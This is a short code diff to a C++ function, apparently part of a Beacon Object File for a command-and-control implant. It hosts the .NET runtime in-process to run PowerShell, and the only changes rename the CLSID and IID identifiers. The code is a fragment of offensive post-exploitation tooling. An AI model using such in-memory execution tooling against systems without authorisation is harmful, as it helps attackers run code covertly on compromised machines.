@@ -72,7 +72,7 @@ auto Dotnet::Pwsh(
     BSTR CreatePipelineBstr = SysAllocString( L"CreatePipeline" );
     BSTR SysManBstr         = SysAllocString( L"System.Management.Automation.Runspaces.Runspace" );
 
-    HResult = CLRCreateInstance( CLSID.CLRMetaHost, IID.ICLRMetaHost, (VOID**)&MetaHost );
+    HResult = CLRCreateInstance( xCLSID.CLRMetaHost, xIID.ICLRMetaHost, (VOID**)&MetaHost );
     if ( FAILED( HResult ) || !MetaHost ) {
         BeaconPrintf( CALLBACK_OUTPUT, "[x] failed on instance the clr: %X", HResult ); return HResult;
     }
@@ -85,7 +85,7 @@ auto Dotnet::Pwsh(
     while ( ( EnumUkwn->Next( 1, &EnumRtm, 0 ) == S_OK ) ) {
         if ( ! EnumRtm ) continue;
 
-        if ( SUCCEEDED( EnumRtm->QueryInterface( IID.ICLRRuntimeInfo, (VOID**)&RtmInfo ) ) && RtmInfo ) {
+        if ( SUCCEEDED( EnumRtm->QueryInterface( xIID.ICLRRuntimeInfo, (VOID**)&RtmInfo ) ) && RtmInfo ) {
             if ( SUCCEEDED( RtmInfo->GetVersionString( FmVersion, &FmBuffLen ) ) ) {
                 BeaconPrintf( CALLBACK_OUTPUT, "[+] supported version: %S", FmVersion );
             }
@@ -94,7 +94,7 @@ auto Dotnet::Pwsh(
 
     BeaconPrintf( CALLBACK_OUTPUT, "[+] using last version: %S", FmVersion );
 
-    HResult = MetaHost->GetRuntime( FmVersion, IID.ICLRRuntimeInfo, (VOID**)&RtmInfo );
+    HResult = MetaHost->GetRuntime( FmVersion, xIID.ICLRRuntimeInfo, (VOID**)&RtmInfo );
     if ( FAILED( HResult ) ) {
         BeaconPrintf( CALLBACK_OUTPUT, "[x] failed: %X", HResult ); return HResult;
     }
@@ -106,7 +106,7 @@ auto Dotnet::Pwsh(
 
     BeaconPrintf( CALLBACK_OUTPUT, "[+] is loadable: %s", IsBl ? "true" : "false"  );
 
-    HResult = RtmInfo->GetInterface( CLSID.CorRuntimeHost, IID.ICorRuntimeHost, (VOID**)&RtmHost );
+    HResult = RtmInfo->GetInterface( xCLSID.CorRuntimeHost, xIID.ICorRuntimeHost, (VOID**)&RtmHost );
     if ( FAILED( HResult ) ) {
         BeaconPrintf( CALLBACK_OUTPUT, "[x] failed: %X", HResult ); return HResult;
     }
@@ -123,12 +123,12 @@ auto Dotnet::Pwsh(
         BeaconPrintf( CALLBACK_OUTPUT, "[x] failed: %X", HResult ); return HResult;
     }
 
-    HResult = AppDomThunk->QueryInterface( IID.AppDomain, (VOID**)&AppDom );
+    HResult = AppDomThunk->QueryInterface( xIID.AppDomain, (VOID**)&AppDom );
     if ( FAILED( HResult ) ) {
         BeaconPrintf( CALLBACK_OUTPUT, "[x] failed: %X", HResult ); return HResult;
     }
 
-    HResult = GetAssemblyLoaded( AppDom, L"mscorlib", IID.MscorlibAsm, &Mscorlib );
+    HResult = GetAssemblyLoaded( AppDom, L"mscorlib", xIID.MscorlibAsm, &Mscorlib );
     if ( FAILED( HResult ) ) {
         BeaconPrintf( CALLBACK_OUTPUT, "[x] failed: %X", HResult ); return HResult;
     }
